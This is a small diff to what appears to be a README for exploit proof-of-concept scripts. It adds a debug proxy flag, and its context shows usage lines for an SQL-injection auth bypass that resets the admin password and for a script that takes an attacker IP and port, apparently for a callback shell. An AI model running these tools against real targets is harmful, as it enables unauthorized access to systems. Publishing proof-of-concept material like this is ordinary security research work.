@@ -29,5 +29,7 @@ poc2ab.py is a standalone auth bypass that will use SQLi to pull the admin usern
  python3 poc2ab.py -t <target> -p <password to set>
  
  python3 poc2.py -t <target> -p <password to set> -i <Attacker IP> -pt <Attacker port>
+ 
+ -d or --debug can be added to utilize Burp or ZAP proxies runnin on 127.0.0.1:8080
   
 
